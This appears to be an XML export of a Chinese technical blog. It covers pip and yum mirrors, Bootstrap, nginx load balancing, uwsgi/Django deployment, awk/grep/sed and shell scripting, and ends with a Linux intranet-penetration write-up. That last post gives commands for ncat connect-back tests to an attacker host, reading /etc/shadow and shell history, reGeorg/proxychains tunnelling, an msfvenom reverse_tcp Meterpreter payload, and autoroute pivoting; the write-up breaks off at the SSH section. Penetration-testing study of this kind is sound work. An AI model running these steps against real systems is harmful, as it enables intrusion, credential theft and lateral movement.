"https://pypi.python.org/packages/source/p/pip/pip-1.5.4.tar.gz#md5=834b2904f92d46aaa333267fb1c922bb"解压以后，进入setuptools文件目录下运行sudo python setup.py install。然后进入pip文件目录下运行sudo python setup.py install。 Usage pip list # 列出所有安装的库 pip list –outdated # 列出所有过期的库 pip install –upgrade 库名 # 更新库 pip install –upgrade pip # 更新pip自身 pip freeze # 查看安装了哪些包 pip install -t /usr/local/lib/python2.7/site-packages/ xlrd # 给指定版本的python安装库 pip install jieba -i https://pypi.douban.com/simple # 单次使用国内源安装 替换pip源国外源的速度在国内下载实在太慢，因此需要更改镜像源，可以改成阿里云或者豆瓣的镜像。 临时使用国内源1pip install jieba -i https://pypi.douban.com/simple # 单次使用国内源安装 阿里云 http://mirrors.aliyun.com/pypi/simple/ 中国科技大学 https://pypi.mirrors.ustc.edu.cn/simple/ 豆瓣 http://pypi.douban.com/simple/ 清华大学 https://pypi.tuna.tsinghua.edu.cn/simple/ 中国科学技术大学 http://pypi.mirrors.ustc.edu.cn/simple/ 修改配置文件编辑pip.cofig文件，文件位置(若不存在则新建一个)： mac:~/.pip/pip.conf linux:~/.pip/pip.conf windows:%HOMEPATH%\pip\pip.ini 12345[global]index-url=http://mirrors.aliyun.com/pypi/simple/[install]trusted-host=mirrors.aliyun.com 保存退出即可。 pip报错处理错误信息：1OSError: [Errno 1] Operation not permitted: 解决方案:12pip install --upgrade pipsudo pip install numpy --ignore-installed yum备份首先备份/etc/yum.repos.d/CentOS-Base.repo文件：1mv /etc/yum.repos.d/CentOS-Base.repo /etc/yum.repos.d/CentOS-Base.repo.backup 下载国内源文件下载对应版本repo文件, 放入/etc/yum.repos.d/，比如网易源： CentOS7 CentOS6 CentOS5 说明：也可以不用下载，通过修改CentOS-Base.repo文件中的源地址即可。 缓存运行以下命令生成缓存：12Yum clean allYum makecache]]></content>
      <categories>
        <category>技术研究</category>
      </categories>
      <tags>
        <tag>Brew</tag>
        <tag>git</tag>
        <tag>yum</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[bootstrap前端框架]]></title>
    <url>../../../../../../../../2017/08/23/1/</url>
    <content type="text"><![CDATA[Let bygones be bygones过去的就让它过去吧 现在Web前端的技术发展得很快，web页面做得越来越炫目。然而作为一名”后端程序员”，不会写css，写不好javascript，不懂jquery怎么办？没关系，本篇将介绍前端开发神器–bootstrap，学会它立马变身前端达人。（题外话：我也是被前端开发搞得心力憔悴后，才发现有这个框架，用起来简直爽！） Who is bootstrap? Bootstrap是由Twitter的Mark Otto和Jacob Thornton开发的，在2011年八月发布的开源产品。Bootstrap是一个用于快速开发Web应用程序和网站的前端框架，其基于 HTML、CSS、JAVASCRIPT。 简单来说，Bootstrap相当于一个封装好的前端模块，而模块中的方法（函数）涵盖了html、css、javascript，封装的功能包含常用的布局、颜色等，直接调用即可。 How to install bootstrap?（一）官网下载编译好的压缩包官网：http://getbootstrap.com/找到下图位置，并下载压缩包，解压后获取css与js文件夹。 （二）Github源码下载Github：https://github.com/twbs/bootstrap说明一下，官方也可以直接下载源码，下载后获取dist里面的css与js文件夹；当然也可以自己编译，参照github上面的教程 （三）使用cdn文件简单来说，使用bootstrap主要就是使用已经封装好的js与css文件，因此也可以不用下载，直接使用官方提供的cdn文件，将以下代码添加到html的head中。123&lt;link rel="stylesheet" href="https://cdn.bootcss.com/bootstrap/3.3.7/css/bootstrap.min.css"&gt; &lt;script src="https://cdn.bootcss.com/jquery/2.1.1/jquery.min.js"&gt;&lt;/script&gt;&lt;script src="https://cdn.bootcss.com/bootstrap/3.3.7/js/bootstrap.min.js"&gt;&lt;/script&gt; How to use bootstrap?具体使用手册可以参考：http://www.runoob.com/bootstrap/bootstrap-tutorial.htmlhttp://www.bootcss.com/ 1234567891011121314151617181920&lt;head&gt; &lt;link rel="stylesheet" href="https://cdn.bootcss.com/bootstrap/3.3.7/css/bootstrap.min.css"&gt; &lt;script src="https://cdn.bootcss.com/jquery/2.1.1/jquery.min.js"&gt;&lt;/script&gt; &lt;script src="https://cdn.bootcss.com/bootstrap/3.3.7/js/bootstrap.min.js"&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;table class="table table-striped"&gt; &lt;tr&gt;&lt;th&gt;test&lt;/th&gt;&lt;th&gt;test&lt;/th&gt;&lt;th&gt;test&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;test&lt;/td&gt;&lt;td&gt;test&lt;/td&gt;&lt;td&gt;test&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt; &lt;button type="button" class="btn btn-success"&gt;成功按钮&lt;/button&gt;&lt;/body&gt; 说明：head中导入js与css，模版很多不过一般这三个就够用了，然后具体的标签中就可以使用class来加载css与js。]]></content>
      <categories>
        <category>编程之道</category>
      </categories>
      <tags>
        <tag>bootstrap</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[nginx负载均衡]]></title>
    <url>../../../../../../../../2017/08/22/1/</url>
    <content type="text"><![CDATA[Give more than you planned to多多给予，不必计较 nginx功能强大且常用作反向代理或者负载均衡，当我们部署了一个web系统之后，面对日益增多的访问流量，采用nginx做负载均衡是一个实惠的方案，本文用来记录nginx实现负载均衡的一些操作。 实验环境 为了能够更符合真实环境，我在本机host上绑定了一个域名phantomjs.me，其ip地址为192.168.1.2，是一台安装了nginx的linux服务器，用来模拟负载均衡服务器；另外同一内网中还有3台web服务器，其ip分别是192.168.1.3，192.168.1.4，192.168.1.5。 实验目的 当我们访问phantomjs.me域名时，负载均衡服务器能够将流量负载到3台web服务器中，负载的方式可以自由选择。 方案设计 （A）192.168.1.2负载均衡服务器监听80端口，用作负载。 （B）192.168.1.3Web服务器监听80端口。 （C）192.168.1.4Web服务器监听80端口。 （D）192.168.1.5Web服务器监听80端口。 说明：A服务器作为负载均衡服务器，域名直接解析到A服务器（192.168.1.2:80）上。由A服务器将流量负载均衡到B服务器（192.168.1.3:80）、C服务器（192.168.1.4:80）和D服务器（192.168.1.5:80）上。负载均衡可以针对不同的服务器，也可以针对同一台服务器的不同端口，主要看实际需求。 nginx具体配置 编辑A服务器的nginx.conf，文件位置在nginx安装目录下，一般在/etc/nginx/nginx.conf。在http段加入以下代码：1234567891011121314151617upstream phantoms.me&#123; # 要与server_name的名字一致 server 192.168.1.3:80; #分别对应三台web服务器 server 192.168.1.4:80; server 192.168.1.5:80;&#125;server&#123; listen 80; #nginx开启的端口 server_name phantoms.me; #测试域名 location / &#123; proxy_pass http://phantomjs.me; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; &#125; access_log /var/log/nginx.log; #添加日志记录&#125; 重启nginx1/etc/init.d/nginx restart 最后访问http://phantomjs.me server中可用的参数默认upstream server后的参数 weight=1 max_fails=1 fail_timeout=10s。 weight：服务器权重 max_fails=number:最大失败尝试次数 fail_timeout=time:设置服务器不可用的时长 backup：备用主机 down：手动标记不再处理任何用户请求 nginx反向代理这里顺便记录一下，用nginx配置反向代理的方法，这种方法也被大量用在网页劫持（黑产）中，这里不详细介绍了。 配置将以下内容添加到nginx配置文件的server中：123location /update/&#123;#将本地update目录代理到baidu.com/update目录下，即访问本地update其实是在访问baidu的update。 proxy_pass http://baidu.com/update; &#125; 重启nginx，尝试访问http://phantomjs.me/update/，其实际获取的是baidu的update目录资源。 关于nginx负载均衡更详细的内容，可以访问：http://www.jusene.me/2017/05/24/nginx-proxy/ 参考文章http://www.jianshu.com/p/ac8956f79206]]></content>
      <categories>
        <category>技术研究</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[nginx+uwsgi部署Django]]></title>
    <url>../../../../../../../../2017/08/21/1/</url>
    <content type="text"><![CDATA[Constant dropping wears the stone滴水穿石 本文用来记录Django部署的一些笔记，文中描述的系统环境为Ubuntu，采用的服务器为nginx以及用uwsgi来连接Django，这也是目前Django比较主流的部署套餐。 部署连接原理浏览器发起web请求&lt;——&gt;nginx接收请求&lt;——&gt;uwsgi处理请求&lt;—–&gt;django程序 环境安装nginx安装nginx1sudo apt-get install nginx 运行并查看状态12/etc/init.d/nginx start/etc/init.d/nginx status Uwsgi先安装python-dev，否则uwsgi安装可能会报错1apt-get install python-dev 安装uwsgi1pip install uwsgi 安装完后添加环境变量:打开文件：sudo vim .bashrc，添加以下内容：1export PATH=/home/nmask/.local/bin/:$PATH 然后运行source .bashrc使之生效，就可以在命令行直接运行uwsgi 环境测试测试nginx1/etc/init.d/nginx start 打开http://localhost:80，能看到nginx说明nginx安装成功。 测试uwsgi项目根目录下创建test.py文件，写入：123def application(env, start_response): start_response('200 OK', [('Content-Type','text/html')]) return "Hello World” 项目根目录下运行：1uwsgi --http :8001 --wsgi-file test.py 访问http://localhost:8001，如果能看到hello world，说明uwsgi安装成功。 利用uwsgi运行django项目1uwsgi --http :8001 --chdir /home/nmask/mydjango --wsgi-file mydjango/wsgi.py --master --processes 4 --threads 2 --stats 127.0.0.1:8080 常用选项： http ： 协议类型和端口号 processes ： 开启的进程数量 workers ： 开启的进程数量，等同于processes（官网的说法是spawn the specified number ofworkers / processes） chdir ： 指定运行目录（chdir to specified directory before apps loading） wsgi-file ： 载入wsgi-file（load .wsgi file） stats ： 在指定的地址上，开启状态服务（enable the stats server on the specified address） threads ： 运行线程。由于GIL的存在，我觉得这个真心没啥用。（run each worker in prethreaded mode with the specified number of threads） master ： 允许主进程存在（enable master process） daemonize ： 使进程在后台运行，并将日志打到指定的日志文件或者udp服务器（daemonize uWSGI）。实际上最常用的，还是把运行记录输出到一个本地文件上。 pidfile ： 指定pid文件的位置，记录主进程的pid号。 vacuum ： 当服务器退出的时候自动清理环境，删除unix socket文件和pid文件（try to remove all of the generated file/sockets） 文件配置myweb_uwsgi.ini项目根目录下创建：myweb_uwsgi.ini文件，写入：1234567891011121314151617181920212223# myweb_uwsgi.ini file[uwsgi]# Django-related settingssocket = :8000# the base directory (full path)chdir = /home/nmask/mydjango# Django s wsgi filemodule = mydjango.wsgi# process-related settings# mastermaster = true# maximum number of worker processesprocesses = 4# ... with appropriate permissions - may be needed# chmod-socket = 664# clear environment on exitvacuum = true 利用uwsgi运行django：（与前面命令行的方式一样，这样为了方便写成了文件）1uwsgi --ini myweb_uwsgi.ini 配置文件参数： socket:指uwsgi运行的端口 Chdir:运行的目录 Module：运行的文件 配置nginx打开/etc/nginx/nginx.conf，http内添加以下内容：123456789101112131415161718192021server &#123; listen 8890; server_name 127.0.0.1 charset UTF-8; access_log /var/log/nginx/myweb_access.log; error_log /var/log/nginx/myweb_error.log; client_max_body_size 75M; location / &#123; include uwsgi_params; uwsgi_pass 127.0.0.1:8000; uwsgi_read_timeout 2; &#125; location /static &#123; expires 30d; autoindex on; add_header Cache-Control private; alias /home/fnngj/pydj/myweb/static/; &#125; &#125; 说明：这里的8000端口是uwsgi的端口，nginx运行将开启8890端口，也就是nginx的8890端口与uwsgi的8000端口相互通信。 部署运行运行uwsgi：1nohup uwsgi --ini myweb_uwsgi.ini &amp; 运行nginx:1/etc/init.d/nginx start 最后访问http://localhost:8890，可以看到django项目已经被运行在nginx上了。 注意：在更新Django代码后，最好重启一下uwsgi进程，避免出现不可预知的Bug！ 坑点 如果服务器是映射的，nginx配置文件里面的server_name要写外网的IP或者域名 不要在python虚拟环境中使用uwsgi，会有一些问题，当然也可以解决，参考：https://stackoverflow.com/questions/14194859/importerror-no-module-named-django-core-wsgi-for-uwsgi 若是uwsgi运行正常，nginx运行也正常，但就是连接不起来，可以检查下系统是否开启了selinux，需要关闭它才行。 报错No module named django.core.wsgi启动uwsgi时报以下错误：1ImportError: No module named django.core.wsgi for uwsgi uwsgi在python虚拟环境中启动时，配置文件里面要加虚拟的路径。打开django.init（自己创建）写入：1home=/path/to/venv/ 运行：1uwsgi --ini django.ini --protocol=http uwsgi http is ambiguous这也是因为虚拟环境的原因，建议退出python的虚拟环境，然后pip install uwsgi。 参考文章http://www.cnblogs.com/fnng/p/5268633.html]]></content>
      <categories>
        <category>技术研究</category>
      </categories>
      <tags>
        <tag>nginx</tag>
        <tag>Django</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【玩转linux系列】awk、grep、sed]]></title>
    <url>../../../../../../../../2017/08/12/1/</url>
    <content type="text"><![CDATA[Learn and live活着，为了学习 awk、grep、sed是linux操作文本的三大利器，也是必须掌握的linux命令之一。三者的功能都是处理文本，但侧重点各不相同，其中属awk功能最强大，但也最复杂。grep更适合单纯的查找或匹配文本，sed更适合编辑匹配到的文本，awk更适合格式化文本，对文本进行较复杂格式处理。以下所有实验输出，均以测试文件test.log内容为基准：12320170102 admin,password Open20170801 nmask,nmask close20180902 nm4k,test filter awkAWK是一种处理文本文件的语言，是一个强大的文本分析工具;awk是以列为划分计数的，$0表示所有列，$1表示第一列，$2表示第二列。 awk参数 -F 指定输入文件折分隔符，如-F: -v 赋值一个用户定义变量，如-va=1 -f 从脚本文件中读取awk命令 注：只列举最常用的参数 分隔符每行按空格分割列，并输出第1、4列123$ awk '&#123;print $1,$4&#125;' test.log或者$ cat test.log | awk '&#123;print $1,$4&#125;' 自定义分隔符使用”,”进行分割，参数用-F1awk -F, '&#123;print $1,$2&#125;' test.log 使用多个分隔符，先使用空格分割，然后对分割结果再使用”,”分割1$ awk -F '[ ,]' '&#123;print $1,$2,$3&#125;' test.log #注意逗号前面有一个空格 设置变量设置awk自定义变量，用参数-v例子：设置变量a为1注意：-v a之间要空格。 字符串拼接：（用””而不是+）1cat test.txt | awk -v a=\" '&#123;print a""$0""a&#125;' 逻辑判断输出第一列为20170801的记录 输出第二列不是nmask,nmask的记录 内建变量NR参数：输出行号 正则表达式输出第二列中包含nm开头的所有记录输出包含2017开头的记录注意：这里没有～，因为没有指定是哪一列 忽略大小写{INGORECASE=1}匹配取反 !~ 内置函数substr字符串截取截取第一列的第一到第四个字符 split切分字符串以逗号分隔第2列的数据，并输出分别输出第2列的内容 gsub替换将第2列中的nmask替换成nMask grepLinux grep命令用于查找文件里符合条件的字符串。 Usage递归查询1grep -r nmask /etc/ #查看/etc目录下内容包含nmask的文件 查询取反1grep -v test test.log sedLinux sed命令是利用script来处理文本文件。 参数-e 以选项中指定的script来处理输入的文本文件。-f 以选项中指定的script文件来处理输入的文本文件。-h 显示帮助。-n 仅显示script处理后的结果。-V 显示版本信息。 动作a ：新增， a 的后面可以接字串，而这些字串会在下一行出现i ：插入， i 的后面可以接字串，而这些字串会在上一行出现c ：取代， c 的后面可以接字串，这些字串可以取代 n1,n2 之间的行d ：删除s ：取代，通常这个s的动作可以搭配正规表示法！如 s/old/new/g 插入操作在test.log文件的第4行后插入一行，内容为nmask1sed -e 4a\nmask test.log 删除操作删除test.log的第2行、第3行数据1cat test.log | sed '2,3d' 匹配删除，删除行中有nmask字符串的 替换操作1sed 's/要被取代的字串/新的字串/g' 参考文章http://www.runoob.com/linux/linux-comm-awk.html]]></content>
      <categories>
        <category>技术研究</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【玩转linux系列】shell编程]]></title>
    <url>../../../../../../../../2017/08/11/1/</url>
    <content type="text"><![CDATA[我猜你可能会问我为什么最近更新得这么勤？因为我在充电！ 如果你去问程序员哪种编程语言最好用，可能会得到很多种答案。但如果问linux下哪种语言使用最方便，shell当之无愧，因为其相当于windows下的bat，可以自动化一些命令操作。当然linux内置安装了很多脚本语言，比如ruby、python等，使用也很方便。作为一名python爱好者，我一般习惯用python去解决问题，但为了能够看懂别人的shell代码，为此也需要学习一些基础的shell语法。 shell变量定义变量普通变量：12a="123"b="test" 只读变量：12a="123"readonly a 顾名思义，只读变量不能改变内容，否则会报如下错误1/bin/sh: NAME: This variable is read only. 使用变量12echo &#123;$a&#125; 或者 echo $ac=$a 只有在使用变量时，变量名前需要加$符号,{}可选当然最好使用。 删除变量1unset a # 不能删除只读变量 shell数据结构字符串12str="123"str='123' 单引号里的任何字符都会原样输出，单引号字符串中的变量是无效的 单引号字串中不能出现单引号（对单引号使用转义符后也不行） 双引号里可以有变量 双引号里可以出现转义字符 字符串与字符串变量的拼接1Str_new="this is "$str"" 或者1Str _new="this is &#123;$str&#125;" 获取字符串长度12string="abcd"echo $&#123;#string&#125; #输出4 字符串切片12string="this is a test"echo $&#123;string:1:4&#125; # 输出test 数组bash支持一维数组（不支持多维数组），并且没有限定数组的大小。 定义数组1a=(1 2 3 4) # 注意是空格隔开而不是逗号 或者1234a[0]=1a[1]=2a[2]=3a[3]=4 读取数组12valuen=$&#123;array_name[n]&#125; # 读取指定下标的元素echo $&#123;array_name[@]&#125; # 读取所有元素 数组的长度取得数组元素的个数1length=$&#123;#array_name[@]&#125; 或者1length=$&#123;#array_name[*]&#125; 取得数组单个元素的长度1lengthn=$&#123;#array_name[n]&#125; shell输入输出重定向echo1234换行：echo -e "OK! \n" #-e 开启转义不换行：echo -e "OK! \c" #-e 开启转义 \c 不换行输出变量名：echo '$a' 输出$a 使用单引号即可输出命令执行结果：echo `date` 使用反引号 printf1234printf "%-10s %-8s %-4s\n"printf "%-10s %-8s %-4.2f\n"printf "%-10s %-8s %-4.2f\n"printf "%-10s %-8s %-4.2f\n" %s %c %d %f都是格式替代符%-10s指一个宽度为10个字符（-表示左对齐，没有则表示右对齐），任何字符都会被显示在10个字符宽的字符内，如果不足则自动以空格填充，超过也会将内容全部显示出来。%-4.2f指格式化为小数，其中.2指保留2位小数。 shell传参shell代码内容1234#!/bin/bashecho $0echo $1echo $2 运行脚本并传参1./shell.sh a b 输出结果123./shell.shab 特殊参数 $# 传递到脚本的参数个数 $ 以一个单字符串显示所有向脚本传递的参数。如”$“用「”」括起来的情况、以”$1 $2 … $n”的形式输出所有参数。 $$ 脚本运行的当前进程ID号 $! 后台运行的最后一个进程的ID号 $@ 与$*相同，但是使用时加引号，并在引号中返回每个参数。如”$@”用「”」括起来的情况、以”$1” “$2” … “$n” 的形式输出所有参数。 $- 显示Shell使用的当前选项，与set命令功能相同。 $? 显示最后命令的退出状态。0表示没有错误，其他任何值表明有错误。 shell函数基本格式123456789[ function ] funname [()]&#123; action; [return int;]&#125; 函数定义1234567Test()&#123;$a=“123”return $a&#125; 函数使用并获取返回值12Testecho $? # $?为函数返回值 函数传参12345678910#函数定义Test()&#123;echo $1echo $2echo $3&#125;#函数使用Test a b c shell流程控制if条件语句if-then-else-fi123456789if conditionthen command1 command2 ... commandNelse commandfi if-then-elif-then-else-fi123456789if condition1then command1elif condition2 then command2else commandNfi for循环语句1234567for var in item1 item2 ... itemNdo command1 command2 ... commandNdone 一句话for循环shell1for i in $(ps -ef | grep python | awk '&#123;print $2&#125;');do kill $i;done while循环语句123456int=1while(( $int&lt;=5 ))do echo $int let "int++"done shell实战1234567891011#! /bin/bash#shell综合运用a=`whoami` #执行命令b=`date`c="open"d=`cat test.log | grep $c`echo $decho "user is $a time is $b" 参考文章http://www.runoob.com/linux/linux-shell.html 传送门【玩转linux系统】Linux内网渗透【玩转linux系列】Vim使用【玩转linux系列】Linux基础命令]]></content>
      <categories>
        <category>编程之道</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>shell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【玩转linux系统】Linux内网渗透]]></title>
    <url>../../../../../../../../2017/08/09/2/</url>
    <content type="text"><![CDATA[Nothing great was ever achieved without enthusiasm无热情成就不了伟业 前段时间做了一次不算成功也不算完整的linux内网渗透，不算成功是因为并没有拿下内网中其他服务器的权限，不算完整是因为由于某些原因测试被迫暂时中止。虽然这次linux内网渗透不算是一个很好的教学案例，但我还是决定把过程记录一下，尤其重点记录linux内网渗透的思路，以防遗忘。 网上关于内网渗透的资料很多，我在做测试之前也是翻阅了很多资料。本篇标题突出linux，是因为本次测试不涉及windows系统，当然linux与windows内网渗透的原理差不多，只不过使用的工具有所区别。 收集测试网络环境 当我们拿到一台目标内网服务器，或者说肉鸡服务器，首先要做的就是收集信息。而在我看来需要收集的信息中，最重要的之一便是肉鸡的网络环境。 实验环境首先介绍下本次测试的服务器环境： 攻击机Mac：110.xx.xx.xx 外网 肉鸡centos：192.168.16.x 目标内网16网段系统 内网渗透范围：192.168.17.0/24 目标内网17网段系统 本次测试模拟假设：由于肉鸡服务器上对外开放了存在漏洞的web应用，被入侵植入webshell。本次测试目的：通过肉鸡服务器上的shell，深入渗透内网17网段的服务器。 收集测试哪些网络数据？ ok，目前我已经拥有了肉鸡的shell，那么该收集肉鸡服务器的哪些网络环境呢？又该如何去测试？我认为至少要收集以下几点网络环境信息： 肉鸡服务器与外网的连通性 肉鸡服务器与内网其他网段的连通性 肉鸡服务器与外网之间是否有端口访问限制 肉鸡服务器与内网其他网段之间是否有端口访问限制 注：连通性主要是指能否ping通，需要双方互相ping测试；端口访问限制，指的是目标网络边界是否有堡垒机或者防火墙，对进出的端口是否有做限制。 端口访问限制测试ping测试这里不介绍了，主要说下如何测试端口访问限制，可以使用的工具如下： curl、wget（可连接web服务，主要为80、443、8000+端口） telnet（可主动连接指定ip的指定port） nmap（可扫描端口，open或者filter） ncat（可以创建端口监听，也可以主动连接） python（可主动创建端口监听）…… 在测试端口访问限制前，我们先要搞清楚当前的网络环境。本次测试中，攻击机在外网而肉鸡在内网，因此正常情况下攻击机是无法直接访问到肉鸡上某个端口的（需要网络边界路由器做端口映射）。 反向连接测试我们在测试端口访问限制时，首先可以利用ncat在攻击机上监听一个端口。1ncat -l -p 9999 然后利用ncat或者telnet等工具在肉鸡上尝试连接，我称之为反向连接测试。1ncat 110.xx.xx.xx 9999 注：监听的端口可以随机选取，尽量选取多个端口尝试多次；如果肉鸡能够访问攻击机的任何端口，说明目标网络边界没有对出方向的连接做限制，了解这方面的信息对后面的端口转发有很大好处。 正向连接测试 我们也可以在肉鸡上监听一个端口，攻击机上尝试连接（这里连接的是肉鸡的外网ip地址，肉鸡对外开放的web应用肯定是以一个外网ip或者域名的形式存在，而该ip在本次测试中并不是肉鸡真正的ip地址，是目标边界网络设备的ip，原理是通过端口映射将网络设备（外网ip）上的web端口映射到了肉鸡（内网ip）的web端口上），我称之为正向连接测试。 尝试连接肉鸡外网地址的端口，意义在于有些粗心的管理员会在网络设备上设置全端口映射，也就是说肉鸡上监听任何端口都能映射到网络边界设备的相同端口上，那么这跟肉鸡服务器直接处在外网就没差了。 收集服务器信息收集信息可以说是渗透测试的第一步，内网渗透也一样，收集的服务器信息越多，渗透的成功率就越大。 查看系统内核linux系统上查看内核版本如下：1lsb_release –a 一般系统的入侵途径是先提权，而提权可以通过linux内核漏洞进行，因此可以先查看linux内核版本，然后根据内核寻找exp的网站，上传exp进行提权。由于本次测试不涉及提权部分，因此不做测试，另外补充一句：内核提权有宕机风险，请谨慎操作。 查看操作系统位数linux系统上查看位数如下：1getconf LONG_BIT 说明：知道系统是32位还是64位对后期生成msf木马有帮助。 系统敏感信息收集一些系统相关的敏感信息，比如账号密码、日志、历史命令、ssh文件等。123456/etc/shadow/etc/passwd/var/loghistory.ssh...... web敏感信息如果服务器存在web应用，可以查看web目录下是否存在敏感信息，比如连接数据库的配置文件等等。 内网扫描 当信息收集完成后，可以尝试扫描一下内网的机器，比如主机存活扫描、端口扫描、arp扫描等。端口扫描可以使用nmap、msf等工具，但如果服务器上没有安装这些工具时，通常有3种手段可以达到内网端口扫描的效果。第一种就是服务器上安装扫描工具，这里不多说也不推荐，因为动静大且麻烦(当然可以上传python扫描端口的脚本，不需要编译安装，比较方便。)；第二种就是端口转发，将服务器内网端口转发到外网进行扫描；第三种就是代理扫描，也就是把装有扫描工具的攻击机代理到目标内网环境。 无论是端口转发扫描还是代理扫描，原理都是打通攻击机（外网）与肉鸡（内网）的连通性，即让攻击机可以直接访问到肉鸡所在的内网资源。这里的连接不借助于目标网络边界设备的端口映射功能，因此与攻击机访问肉鸡web服务所产生的连接有所区别。 端口转发 想要达到以上所介绍的彼此”直接”的连接，我们需要一个中间的桥梁，来传递内外网（攻击机与肉鸡）之间的数据。搭建这种桥梁的方式有很多，我们首先可以想到端口转发，即把肉鸡服务器上的某个端口转发到攻击机的某个端口上，这样攻击机上访问本机某个端口，就相当于访问了肉鸡服务器上的某个端口。 端口转发的工具：lcx、meterpreter等，具体用法后面会介绍端口转发类型：tcp端口转发、http转发、ssh转发等 tcp端口转发本机转发：攻击机上监听2222、3333端口，肉鸡上连接攻击机的2222端口，并转发肉鸡22端口。转发连接原理：1肉鸡22端口&lt;--&gt;肉鸡随机高端口&lt;--&gt;肉鸡随机高端口&lt;--&gt;攻击机上2222高端口&lt;--&gt;攻击机随机高端口&lt;--&gt;攻击机3333端口 注：此时我们去连接攻击机的3333端口，就相当于连接了肉鸡的22端口。 远程转发：攻击机上监听2222、3333端口，肉鸡上连接攻击机的2222端口，并转发内网目标服务器的22端口。（前提是肉鸡能够连接目标服务器的22端口）转发连接原理：1内网目标服务器22端口&lt;--&gt;肉鸡随机高端口&lt;--&gt;肉鸡随机高端口&lt;--&gt;攻击机上2222高端口&lt;--&gt;攻击机随机高端口&lt;--&gt;攻击机3333端口 注：此时我们去连接攻击机的3333端口，就相当于连接了目标服务器的22端口。 说明：从上面的连接过程不难看出，端口转发比较难以防范的原因就在于，攻击机上监听的端口是随机的，不可预知的，因此不可能事先在堡垒机或者防火墙上做出方向的端口策略，除非禁止服务器访问外部所有端口（现实情况大多只对进方向的端口连接做限制）。 http转发 有些安全意思强的管理员，会对一些服务器做禁止访问外网的策略，即服务器禁止连接任何外网的端口。此时普通的tcp端口转发就没有效果了，因为转发的前提是要能互相连接上。此种情况，可以使用http转发。转发连接原理：1肉鸡web端口(80)&lt;--&gt;网络边界设备端口(80)&lt;--&gt;攻击机随机端口 注：这里之所以能够连通，是借助了服务器上的web服务，以及网络边界设备的映射功能。 说明：虽然肉鸡不能访问外网任何端口，但只要它对外提供web服务，就说明它还能跟外界通信，只不过这种通信局限于web服务端口中，并且肉鸡不是直接跟攻击机通信，而是借助了边界设备。 代理扫描内网 以上介绍了几种端口转发的使用以及原理，从中我们不难看出端口转发固然厉害，但也很局限，因为每次都只能转发一个ip的一个端口，对于扫描来说，并不是最好的选择方案。因此出现了一种更好的技术方案–代理扫描，其原理与端口转发差不多，都是需要搭建一个桥梁，而这个桥梁往往不是某个端口，而是shell或者说session。 代理扫描同样可以分为tcp代理扫描、http代理扫描。 http代理转发如果目标服务器有web系统，可以使用Regeorg + proxychains。工具下载：reGeorg、proxychains将reGeorg的tunnel文件上传到肉鸡服务器到网站目录下，攻击机执行：1python reGeorgSocksProxy.py -p 2333 -u http://test.com/tunnel.php 然后修改proxychains.conf 配置文件1vim /etc/proxychains.conf （mac上在~/.proxychains/proxychains.conf ,没有则自己创建） 在最后一行添加socks5 127.0.0.1 2333(与regeorg设置的端口相同) 最后在攻击机使用扫描工具时，可以在执行的命令前加proxhchains4, 比如：1proxychains4 nmap -sT -Pn -n 192.168.16.0/24 注：此方案适合攻击者与肉鸡服务器都在各自内网环境，攻击者可以访问到目标服务器的http服务，通过该http服务进行代理转发（速度较慢）. tcp代理转发思路：通过metasploit木马反弹一个肉鸡的meterpreter shell到攻击机上，然后在meterpreter shell上设置路由，我们便可以在攻击机上直接扫描肉鸡所在的网段服务器（这里是可以跨网段扫描的）。 生成msf木马生成木马：1msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=攻击机ip LPORT=8000 -f elf &gt; shell_8000.elf 由于攻击机无法访问肉鸡的端口，而肉鸡可以访问攻击机的端口，因此生成一个反向的木马。 反弹shell 攻击机运行msfconsole，使用exoloit/multi/handler模块，set payload linux/x86/meterpreter/reverse_tcp跟生成木马时用的payload一样。LPORT设置成木马将要连接的端口，运行后会在攻击机上监听一个端口，等待木马链接。 此时将shell_8000.elf上传到肉鸡服务器上，添加权限后运行木马将会主动连接上攻击机监听的端口，并在攻击机上获取一个meterpreter shell。 设置路由上一步获取到了一个session，这个session是攻击机与肉鸡相互连接的会话。查看下肉鸡的网络情况：1run get_local_subnets 添加路由:1run autoroute -s 192.168.16.0/24 查看路由：1run autoroute –p 一般来说，这里设置好路由就可以了，但是有些时候会发现在meterpreter中有效果，但是在msf中失效了，因此可以在msf中再设置一次。（但前提是meterpreter会话要一直存在）将该会话放入后台，进入msf中添加路由。查看路由：这里已经是添加好的结果，添加路由命令：12msf exploit(handler) &gt; route add 192.168.16.0 255.255.255.0 12msf exploit(handler) &gt; route add 192.168.17.0 255.255.255.0 12 注意：12表示session id，由于我们需要访问17网段，因此这里也要添加17网段的路由。 说明：以上2条路由的意思，是攻击机如果要去访问17或者16网段的资源，其下一跳是session12，至于什么是下一条这里不多说了，反正就是目前攻击机可以访问内网资源了。 转发连接原理：1攻击机&lt;--&gt;meterpreter_shell（session）&lt;--&gt;肉鸡 # 这里不是端口的概念，而是路由 tcp全局代理转发 通过以上设置，在msf中可以访问内网资源了，但也仅限在msf中可以访问。如果想要其他工具也能使用代理，则要设置全局代理，这需要使用msf框架中的socks4a工具代理，目录：auxiliary/server/socks4a，然后配合Proxychains ，使用方法跟http代理类似。 注：此代理不是http代理，是tcp代理，因此需要目标服务器或者攻击者服务器，有一方在外网的环境，不然木马端口无法连接，也就无法获取meterpreter shell。 metasploit操作可参考：【渗透神器系列】Metasploit 端口扫描工具推荐使用metasploit进行tcp代理转发后，利用msf上面整合的很多扫描模块，直接进行扫描。扫描模块： auxiliary/scanner/portscan 端口扫描 scanner/portscan/syn SYN端口扫描 scanner/portscan/tcp TCP端口扫描…… 除此之外，也可以使用nmap等扫描工具，结合tcp全局代理转发即可。 针对22端口的入侵 